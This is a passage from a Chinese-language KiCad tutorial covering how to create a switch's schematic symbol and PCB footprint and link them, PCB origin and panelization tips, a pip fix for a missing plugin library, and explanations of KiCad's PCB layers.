<code>无源</code>，<strong>方向</strong>设置为 <code>向右</code>，<strong>X 坐标</strong>设置为<code>-5.08</code>，<strong>Y 坐标</strong>设置为 <code>0</code>，最后按下【<strong>确定</strong>】按钮把引脚放置在编辑区当中：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/61.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/61.png"></a></p><blockquote><p><strong>注意</strong>：如果需要再次编辑当前选中的引脚属性，可以【<strong>鼠标双击</strong>】引脚符号，或者选择鼠标右键菜单当中的【<strong>属性</strong>】，以及直接按下快捷键【<strong>E</strong>】。</p></blockquote><p>接下来直接按下键盘上的【<strong>Insert</strong>】按键，在上述引脚的右侧放置一个<strong>引脚编号</strong>为 <code>3</code> 的引脚，并将其<strong>引脚名称</strong>设置为 <code>B</code>，<strong>引脚编号</strong>自动被赋值为 <code>3</code>，<strong>方向</strong>设置为 <code>向左</code>，<strong>X 坐标</strong>设置为<code>5.08</code>，<strong>Y 坐标</strong>设置为 <code>0</code>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/62.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/62.png"></a></p><p><strong>原理图符号的引脚必须放置在 <code>1.27mm/50mil</code> 尺寸的网格</strong>，没有与网格对齐的引脚将无法在<strong>原理图编辑器</strong>当中进行<strong>连线</strong>操作。经过上述一系列操作之后，获得的效果如下图所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/63.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/63.png"></a></p><blockquote><p><strong>注意</strong>：快捷键【<strong>Insert</strong>】在 <strong>KiCad</strong> 当中用于重复上一个动作，此时所添加原理图符号的编号将会自动增长。</p></blockquote><h3 id="放置其它图形"><a href="#放置其它图形" class="headerlink" title="放置其它图形"></a>放置其它图形</h3><p>在编辑区按下鼠标右键，选择弹出菜单当中的【<strong>网格</strong>】，将<strong>符号编辑器</strong>的网格从 <code>1.27mm/50mil</code> 切换至<strong>更小的尺寸</strong>，以便于绘制其它的图形：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/64.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/64.png"></a></p><p>在更小的网格尺寸下，分别再绘制一个<strong>矩形</strong>和<strong>圆形</strong>，使得原理图符号的形状更加接近于<strong>单刀单掷开关</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/65.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/65.png"></a></p><blockquote><p><strong>注意</strong>：在完成了其它图形的绘制操作之后，务必从更小的网格尺寸切换回 <code>1.27mm/50mil</code> 网格。</p></blockquote><h3 id="编辑符号属性"><a href="#编辑符号属性" class="headerlink" title="编辑符号属性"></a>编辑符号属性</h3><p>鼠标点击<strong>符号编辑器</strong>菜单栏上的【<strong>文件 ➞ 符号属性</strong>】，或者【<strong>鼠标双击</strong>】中间的编辑区，打开【<strong>库符号属性</strong>】对话框，将<code>关键字</code>描述设置为 <code>SPST Switch Toggle</code>，点击【<strong>确定</strong>】按钮并且保存，这样就完成了<strong>原理图符号</strong>的绘制：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/66.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/66.png"></a></p><h2 id="自定义-PCB-封装"><a href="#自定义-PCB-封装" class="headerlink" title="自定义 PCB 封装"></a>自定义 PCB 封装</h2><p>前面完成了<strong>原理图符号</strong>的绘制工作之后，接下来着手进行 <strong>PCB 封装</strong>的绘制，同样用鼠标点击<strong>PCB 编辑器</strong>顶部菜单栏的【<strong>工具 ➞ 封装编辑器</strong>】，就可以打开 <strong>PCB 封装编辑器</strong>对话框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/67.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/67.png"></a></p><p>继续点击<strong>封装编辑器</strong>顶部菜单栏的【<strong>文件 ➞ 新建库</strong>】，新建一个名称为 <code>Getting_Started.pretty</code> 的封装库，依然将其加入至【<strong>工程</strong>】库表，并且选择存放在当前的工程目录下面，此时<strong>封装编辑器</strong>左侧的【<strong>库</strong>】面板就会自动刷新显示出 <code>Getting_Started</code> 库：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/68.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/68.png"></a></p><h3 id="新建封装"><a href="#新建封装" class="headerlink" title="新建封装"></a>新建封装</h3><p>鼠标选中左侧【<strong>库</strong>】面板当中的 <code>Getting_Started</code> 库，再选择鼠标右键菜单当中的【<strong>新建封装</strong>】选项，设置封装名称为 <code>Switch_Toggle_SPST_NKK_M2011S3A1x03</code>，封装类型为<code>通孔</code>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/69.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/69.png"></a></p><p>点击【<strong>确定</strong>】按钮，就可以在<strong>封装编辑器</strong>的左侧【<strong>库</strong>】面板当中看到这个新建的封装：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/70.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/70.png"></a></p><h3 id="放置焊盘"><a href="#放置焊盘" class="headerlink" title="放置焊盘"></a>放置焊盘</h3><p>这个<strong>单刀单掷开关</strong>拥有 2 个引脚，在数据手册当中的编号分别为 <code>2</code> 和 <code>3</code>，引脚之间的间距为 <code>4.7mm</code>。这里鼠标依次点击<strong>封装编辑器</strong>顶部菜单栏上的【<strong>视图 ➞ 网格属性</strong>】，打开【<strong>网格设置</strong>】对话框，添加一个尺寸为 <code>4.7mm</code> 的自定义网格：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/71.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/71.png"></a></p><p>添加好自定义网格之后，切换<strong>封装编辑器</strong>顶部工具栏上的【<strong>网格</strong>】为上面设置的 <code>4.7mm</code> <strong>用户网格</strong>：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/72.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/72.png"></a></p><p>接下来，鼠标点击<strong>封装编辑器</strong>右侧工具栏上的【<strong>添加焊盘</strong>】按钮，习惯上<strong>通孔封装</strong>的引脚 <code>1</code> 通常会位于编辑区坐标的 <code>(0, 0)</code> 位置（即封装左上角处），由于这个<strong>单刀单掷开关</strong>没有编号为 <code>1</code> 的引脚，因而只能将 <code>(0, 0)</code> 的位置留空，并且把焊盘 <code>2</code> 和 <code>3</code> 分别放置在 <code>(0, 4.7mm)</code> 和 <code>(0, 9.4mm)</code> 的坐标位置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/73.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/73.png"></a></p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/74.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/74.png"></a></p><blockquote><p><strong>注意</strong>：由于<strong>单刀单掷开关</strong>的引脚对角线尺寸为 <code>1.42mm</code>，所以需要将<strong>钻孔</strong>的尺寸设置为 <code>1.42mm + 0.2mm = 1.62mm</code>，<strong>焊盘</strong>的尺寸设置为 <code>1.62mm + 2 × 0.15mm = 1.92mm</code>。</p></blockquote><p>观察可以发现此时的焊盘尺寸过小，因而可以将<strong>焊盘</strong>的尺寸增大至 <code>1.62mm + 2 × 0.3mm = 2.22mm</code>，以确保更好的固定开关元件。由于 <strong>KiCad</strong> 的许多输入框都能够直接输入数学表达式，这里分别选择焊盘 <code>2</code> 和 <code>3</code> 按下快捷键【<strong>E</strong>】修改其属性，直接将等式 <code>1.62 + 2 * 0.3</code> 作为焊盘的尺寸输入进去，然后按下【<strong>确定</strong>】按钮进行保存：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/75.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/75.png"></a></p><h3 id="制作轮廓"><a href="#制作轮廓" class="headerlink" title="制作轮廓"></a>制作轮廓</h3><p>制作封装轮廓的时候，首先会在 <strong>KiCad</strong> 的<strong>制造层</strong>（<code>F.Fab</code>）绘制一个精确的<strong>真实轮廓</strong>，用于标识元件的实际尺寸；然后在<strong>丝印层</strong>（<code>F.Silkscreen</code>）绘制一个稍大一些的<strong>丝印轮廓</strong>，用于展示元件的安装位置，而在<strong>封装层</strong>（<code>F.Courtyard</code>）绘制一个更大的<strong>封装轮廓</strong>，用于防止与其它的封装发生重叠。</p><p>第一步，鼠标点击<strong>封装编辑器</strong>右侧外观面板当中的 <code>F.Fab</code> 切换到<strong>制造层</strong>，此时的轮廓必须与元件的物理尺寸精确匹配，即宽度为 <code>7.9mm</code>，高度为 <code>13mm</code>。接下来，就可以利用右侧工具栏当中提供的<strong>线</strong>、<strong>圆弧</strong>、<strong>圆形</strong>、<strong>矩形</strong>、<strong>多边形</strong>工具绘制轮廓。通过将用户网格设置为如下参数，可以实现矩形轮廓的精确放置：</p><ul><li><strong>网格尺寸 X 和 Y</strong> 分别设置为 <code>7.9mm</code> 和 <code>13mm</code>；</li><li><strong>网格原点坐标 X 和 Y</strong> 分别设置为 <code>7.9mm / 2 = 3.95mm</code> 和 <code>4.7mm - (13mm / 2) = -1.8mm</code>；</li></ul><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/76.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/76.png"></a></p><p>首先，切换<strong>封装编辑器</strong>顶部工具栏上的【<strong>网格</strong>】为上面设置的<strong>用户网格</strong>；然后，在右侧【<strong>外观</strong>】面板切换至 <code>F.Fab</code> <strong>制造层</strong>；最后，点击右侧工具栏当中的【<strong>绘制矩形</strong>】按钮，用鼠标拖拽出一个下图这样的矩形框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/77.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/77.png"></a></p><p>第二步，切换到 <code>F.Silkscreen</code> <strong>丝印层</strong>，因为<strong>丝印轮廓</strong>正好在<strong>真实轮廓</strong>之外，所以绘制的时候需要向外移动 <code>0.11mm</code>。这里同样可以通过设置如下的自定义网格参数，快速实现轮廓的精确绘制：</p><ul><li><strong>网格尺寸 X 和 Y</strong> 分别设置为 <code>7.9mm + 2 * 0.11mm = 8.12mm</code> 和 <code>13mm + 2 * 0.11mm = 13.22mm</code>；</li><li><strong>网格原点坐标 X 和 Y</strong> 分别设置为 <code>8.12mm / 2 = 4.06mm</code> 和 <code>-1.8mm - 0.11mm = -1.91mm</code>；</li></ul><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/78.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/78.png"></a></p><p>依然选中右侧工具栏当中的【<strong>绘制矩形</strong>】按钮，使用鼠标在<strong>真实轮廓</strong>外面拖拽出一个类似于下图这样的矩形框：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/79.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/79.png"></a></p><p>第三步，切换到 <code>F.Courtyard</code> <strong>封装层</strong>，同样由于<strong>封装轮廓</strong>正好位于<strong>丝印轮廓</strong>外侧，所以绘制时依然需要向外移动 <code>0.25mm</code>。这里不再利用自定义网格的方式进行精确的绘制，而是直接切换至 <strong>KiCad</strong> 预定义的 <code>1mm</code> 网格，使用鼠标点击【<strong>绘制矩形</strong>】按钮并大致的拖拽出一个下图这样的矩形：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/80.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/80.png"></a></p><p>接下来再选中这个矩形，选择鼠标右键菜单当中的【<strong>属性</strong>】，或者按下快捷键【<strong>E</strong>】，打开【<strong>矩形属性</strong>】对话框，分别设置该矩形<strong>起始点</strong>的 <strong>X</strong> 与 <strong>Y</strong> 坐标为 <code>-4.2mm</code> 和 <code>-2.05mm</code>，<strong>结束点</strong>的 <strong>X</strong> 与 <strong>Y</strong> 坐标为 <code>4.2mm</code> 和 <code>11.45mm</code>，按下【<strong>确定</strong>】按钮之后，<strong>封装轮廓</strong>就会自动缩小至正确的位置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/81.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/81.png"></a></p><p>第四步，按照下图展示的样子，重新摆放一下封装当中的文字信息，从而就完成了 PCB 封装的全部绘制工作：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/82.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/82.png"></a></p><blockquote><p><strong>注意</strong>：<strong>KiCad</strong> 官方提出<a href="https://klc.kicad.org/">《KiCad Library Convention》</a>规范用于维护高质量的<strong>原理图符号</strong>与 <strong>PCB 封装</strong>库。</p></blockquote><h2 id="关联符号与封装"><a href="#关联符号与封装" class="headerlink" title="关联符号与封装"></a>关联符号与封装</h2><p>返回到<strong>符号编辑器</strong>，打开<strong>单刀单掷开关</strong>的原理图符号，依次打开【<strong>文件 ➞ 符号属性</strong>】，打开【<strong>库符号属性</strong>】对话框，鼠标单击 <code>Footprint</code> 字段，选择刚才在 <code>Getting_Started</code> 封装库下制作的 <code>Switch_Toggle_SPST_NKK_M2011S3A1x03</code> 封装，完成之后再点击【<strong>确定</strong>】按钮保存配置：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/83.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/83.png"></a></p><p>从现在开始，<strong>单刀单掷开关</strong>的<strong>原理图符号</strong>与 <strong>PCB 封装</strong>之间就建立起了关联，每次从原理图更新 PCB 时，就不需要再手动选择封装。接下来再打开<strong>原理图编辑器</strong>，将上面绘制的<strong>单刀单掷开关</strong>原理图符号添加到电路里去，并且重新进行【<strong>填写原理图符号位号</strong>】和【<strong>执行电气规则检查</strong>】的操作，最后得到的原理图如下面所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/84.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/84.png"></a></p><p>保存上面的原理图，然后按下【<strong>F8</strong>】键，将原理图更新到 PCB 电路板，并且删除之前的<code>布线</code>与<code>过孔</code>，在【<strong>PCB 编辑器</strong>】当中重新进行<strong>布局</strong>、<strong>布线</strong>、<strong>覆铜</strong>、<strong>设计规则检查</strong>，并且添加上丝印 <code>UinIO.com by Hank</code>，最后得到的 PCB 电路板如下图所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/85.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/85.png"></a></p><p>在【<strong>PCB 编辑器</strong>】按下快捷键【<strong>Alt + 3</strong>】打开 <strong>3D 查看器</strong>，就可以对 PCB 电路板的效果进行预览：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/86.gif"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/86.gif"></a></p><p><strong>原理图编辑器</strong>当中的每一个符号都需要分配相应的封装，分配给每一个原理图符号的封装名称，都会被保存在【<strong>符号属性</strong>】的 <code>Footprint</code> 字段里面：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/87.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/87.png"></a></p><blockquote><p><strong>注意</strong>：<strong>原理图符号</strong>必须指定相应的 <strong>PCB 封装</strong>，但是反过来 <strong>PCB 封装</strong>并不需要关联至<strong>原理图符号</strong>。</p></blockquote><p>封装的 3D 模型同样会被保存在【<strong>封装属性</strong>】的 <strong>3D 模型</strong>标签下面，<strong>KiCad</strong> 可以支持以 <code>.step</code> 和 <code>.wrl</code> 作为后缀的 3D 模型格式，这些格式可以通过 <a href="https://www.freecadweb.org/"><strong>FreeCad</strong></a> 和 <a href="https://github.com/easyw/kicadStepUpMod/"><strong>KiCad StepUp</strong></a> 两个工具进行创建：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/88.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/88.png"></a></p><p>总而言之，<code>原理图符号</code>、<code>PCB 封装</code>、<code>3D 模型</code>三者之间的关联关系可以概括为<strong>原理图符号 ➥ PCB 封装 ➥ 3D 模型</strong>，全文至此正式结束，更多关于 <strong>KiCad</strong> 使用技巧方面的内容，可以直接浏览<a href="https://docs.kicad.org/">《<strong>KiCad 官方文档</strong>》</a>。</p><h2 id="PCB-原点"><a href="#PCB-原点" class="headerlink" title="PCB 原点"></a>PCB 原点</h2><p>KiCAD 的 PCB 编辑器当中，<strong>原点</strong>的位置可以被设置为<strong>图框原点</strong>（编辑器图框左上角）、<strong>钻孔&#x2F;放置文件原点</strong>（手动放置）、<strong>网格原点</strong>（手动放置）三种形式。由于历史遗留原因，PCB 编辑器默认的坐标系原点位置计算方式如下所示：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/89.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/89.png"></a></p><p>可以发现上图当中 <strong>Y 轴</strong>的定义，与传统认知当中数学平面直角坐标系的定义相悖（如下图所示）：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/90.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/90.png"></a></p><p>面对这种情况，可以通过 PCB 编辑器【<strong>偏好设置</strong>】下的<strong>原点和轴</strong>的选项进行调整：</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/91.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/91.png"></a></p><h2 id="拼板"><a href="#拼板" class="headerlink" title="拼板"></a>拼板</h2><p>KiCAD 插件 <a href="https://github.com/sej7278/kicad-panelizer"><strong>kicad panelizer</strong></a> 只能支持一款 PCB 的复制拼板，如果需要拼接多块不同的 PCB，则推荐使用 <a href="https://github.com/ThisIsNotRocketScience/GerberTools"><strong>GerberTools</strong></a> 工具。</p><p><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/92.png"><img src="http://www.uinio.com/Electronics/KiCad_Tutorial/92.png"></a></p><h2 id="插件缺失-pyclipper-的问题"><a href="#插件缺失-pyclipper-的问题" class="headerlink" title="插件缺失 pyclipper 的问题"></a>插件缺失 pyclipper 的问题</h2><p>解决<strong>过孔栅栏生成器（Via Fence Generator）</strong> 插件找不到 <code>pyclipper</code> 库的问题，可以进入 <strong>KiCad</strong> 安装目录下的 <code>D:\Software\Tech\KiCad\bin</code>，执行 <code>python -m pip install pyclipper</code> 命令即可解决问题。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span>D:\Software\Tech\KiCad\bin</span><br><span></span><br><span>λ python -m pip install pyclipper</span><br><span>Collecting pyclipper</span><br><span>  Downloading pyclipper-1.3.0.post3-cp39-cp39-win_amd64.whl (94 kB)</span><br><span>     ---------------------------------------- 94.4/94.4 kB 179.4 kB/s eta 0:00:00</span><br><span>Installing collected packages: pyclipper</span><br><span>Successfully installed pyclipper-1.3.0.post3</span><br></pre></td></tr></tbody></table><h1 id="KiCad中PCB层"><a href="#KiCad中PCB层" class="headerlink" title="KiCad中PCB层"></a>KiCad中PCB层</h1><p><strong>Kicad里Pcbnew提供了至多50个层供电路板设计师使用。</strong></p><ul><li>总计32个铜层供导线走线（可覆铜）</li><li>总计14个固定用途技术层</li><li>12个技术层对（上技术层和下技术层对称），包括Adhesive, Solder Paste, Silk Screen, Solder Mask, Courtyard, Fabrication，共计6对。在KiCad里Pcbnew的层描述中，F.代表电路板上层（Front），B.代表电路板的下层（Back）</li><li>2个独立技术层：Edge Cuts, Margin<br>总计4个辅助层可以任意使用：Comments, E.C.O. 1, E.C.O. 2, Drawings</li></ul><h1 id="1-层设置"><a href="#1-层设置" class="headerlink" title="1. 层设置"></a>1. 层设置</h1><p>在Pcbnew工具栏的设计规则(D)中，选择层设置(L)。在弹出的图层设置对话框中，可以选择铜层的层数（从2到32）和电路板的厚度（通常是1.6mm）。在层类型中，还可以选择铜层的类型（信号、电源、混合、跳线四种）。</p><h1 id="2-层描述"><a href="#2-层描述" class="headerlink" title="2. 层描述"></a>2. 层描述</h1><h2 id="2-1-铜层"><a href="#2-1-铜层" class="headerlink" title="2.1 铜层"></a>2.1 铜层</h2><p>铜层是用于放置和重新布置导线的工作层。 层号从0开始（第一个铜层，在上层，即F.Cu），并以31（最后一个铜层，在下层，即B.Cu）结束。 由于元件不能放置在内层（层1到层30）中，所以只有层0（F.Cu）和层31（B.Cu）是元件层。</p><p>任何铜层的名字都是可以编辑的。层0的默认名称为F.Cu，层31的默认名称为B.Cu。当电路板是2层板时，层0和层31之间没有其他的铜层。当电路板是4层板时，层0和层31中间多了两个铜层，名称按从上层到下层的顺序依次为In1.Cu和In2.Cu。当电路板是6层板时，层0和层31中间多了四个铜层，名称按从上层到下层的顺序依次为In1.Cu，In2.Cu，In3.Cu和In4.Cu。</p><p>通常，电路板是2层时，采用如下结构：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">F.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>B.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br></code></pre></td></tr></table></figure><p>通常，电路板是4层时，采用如下结构：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">F.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In1.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In2.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VCC Plane<br>B.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br></code></pre></td></tr></table></figure><p>通常，电路板是6层时，采用如下结构：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">F.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In1.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In2.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In3.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In4.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VCC Plane<br>B.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br></code></pre></td></tr></table></figure><p>通常，电路板是8层时，采用如下结构：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">F.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In1.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In2.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In3.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VDD Plane<br>In4.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In5.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In6.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VCC Plane<br>B.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br></code></pre></td></tr></table></figure><p>通常，电路板是10层时，采用如下结构：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">F.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In1.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In2.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In3.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In4.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VDD Plane<br>In5.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>GND Plane<br>In6.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In7.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br>In8.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>VCC Plane<br>B.Cu <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>Signal<br></code></pre></td></tr></table></figure><h2 id="2-2-技术层对"><a href="#2-2-技术层对" class="headerlink" title="2.2 技术层对"></a>2.2 技术层对</h2><p>KiCad中12个技术层总是成对出现的：上层一个，下层一个。可以通过F.或者B.来区分它们的位置。</p><p>KiCad中的6个技术层对分别为：</p><ol><li><p>Adhesive (F.Adhes and B.Adhes)粘合层</p><p> 用于在波峰焊前将SMD元件的粘合剂粘贴到电路板上的粘合层。</p></li><li><p>Solder Paste (F.Paste and B.Paste)焊膏层</p><p> 用于在回流焊接之前生产掩模以允许焊膏放置在SMD元件的焊盘上。 通常这些层只有表面安装元件的焊盘。</p></li><li><p>Silk Screen (F.SilkS and B.SilkS)丝印层</p><p> 它们是元件的图样出现的层，也就是你画的东西，用于辅助元件的安装。如元件极性，第一针脚，安装参考图等等…</p></li><li><p>Solder Mask (F.Mask and B.Mask)阻焊层</p><p> 这两个层定义了焊接的掩模，也就是不过绿油的区域。所有焊盘都要出现在这两个层的其中一个层（SMD元件）或者所有两个层（通孔元件）以防止焊盘被过油，影响导电。<strong>阻焊层的作用是旨在防止氧化并避免在紧密间隔的焊盘之间形成焊桥。</strong></p></li><li><p>Courtyard (F.CrtYd and B.CrtYd)空间层</p><p> 用于显示元件在PCB上实际占用的空间大小。</p></li><li><p>Fabrication (F.Fab and B.Fab)生产层</p><p> 用于辅助元件贴装。</p></li></ol><h2 id="2-3-独立技术层"><a href="#2-3-独立技术层" class="headerlink" title="2.3 独立技术层"></a>2.3 独立技术层</h2><ul><li><p>Edge.Cuts边界层<br>  用于绘制电路板轮廓。 放置在此层上的任何元素（图形，文本…）都显示在所有其他图层上。所以请仅使用此图层绘制PCB的轮廓。</p></li><li><p>Margin边界层（目前没发现有什么特别的用处）</p></li></ul><h2 id="2-4-通用层"><a href="#2-4-通用层" class="headerlink" title="2.4 通用层"></a>2.4 通用层</h2><p>这些层可以任意使用。 它们可以是组装或布线等的说明文本，也可以是组装或加工的构造图。 它们的名字是：</p><ul><li>Comments，</li><li>E.C.O. 1，</li><li>E.C.O. 2，</li><li>Drawings</li></ul><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="什么是Mark点"><a href="#什么是Mark点" class="headerlink" title="什么是Mark点"></a>什么是Mark点</h2><p>Mark点的主要作用使用用来定位使用的，根据其定位的对象的不同可以分为一下几种Mark点：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405051832135.png">- </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405051834706.png"></p><p>虽然 <code>Mark点</code> 作用都是定位，但是每一个 <code>Mark点</code> 定的东西都是不一样的：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405051835155.png"></p><p>放置 <code>Mark点</code> 的位置：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405051840582.png"></p><h2 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h2><p>下图是关于总线的使用：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062207319.png"></p><h2 id="标签种类"><a href="#标签种类" class="headerlink" title="标签种类"></a>标签种类</h2><p><code>KiCad</code> 